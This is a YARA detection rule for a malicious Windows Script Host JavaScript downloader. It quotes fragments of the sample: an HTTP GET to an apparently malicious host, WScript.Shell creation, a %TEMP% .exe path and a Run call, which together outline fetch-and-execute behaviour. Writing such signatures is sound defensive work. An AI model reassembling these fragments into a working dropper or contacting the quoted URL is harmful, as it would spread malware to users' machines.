rule sig_20160330_5841f0bfc210e79260b54e5edaa8d0eb {
  meta:
    description = "datamaliciousorder - file 20160330_5841f0bfc210e79260b54e5edaa8d0eb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d38d2a1c207b6503ee75462fe32f944bea4238cd2b0c4a7e79789e53b6fb8a48"

  strings:
    $s1  = "S0[MJ](\"GET\", \"http://beimeihuifu.com/n7dja\", false);" fullword ascii
    $s2  = "var BJ = function L() {return WScript[T](\"WScript\"+\".Shell\");}(), NC = 11;" fullword ascii
    $s3  = "function X(O, DU){DL = DL * 1; return O - DU;};" fullword ascii
    $s4  = "if (S0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function V(){return R + \"\";};" fullword ascii
    $s6  = "function LW() {return BJ[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"JcUMkqVSDuJhBWq.ex\" + \"e\";};" fullword ascii
    $s7  = "function HN(QP){BJ[\"Run\"](QP, DL, DL);};" fullword ascii
    $s8  = "function XO() {return ((LC == true) && (LC == HG)) ? 1 : DL;};" fullword ascii
    $s9  = "}while (TA);" fullword ascii
    $s10 = "function L0()" fullword ascii
    $s11 = "return X(FW, N);" fullword ascii
    $s12 = "var XI = new this[\"Date\"]();" fullword ascii
    $s13 = "function EJ(){return T;};" fullword ascii
    $s14 = "function I(Y) {var P = (1, 2, 3, 4, 5, Y); return P;};" fullword ascii
    $s15 = "function YF(){return 22;};" fullword ascii
    $s16 = "var NS = false;" fullword ascii
    $s17 = "var HG = false;" fullword ascii
    $s18 = "LC = true; " fullword ascii
    $s19 = "HG = true; " fullword ascii
    $s20 = "var LC = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}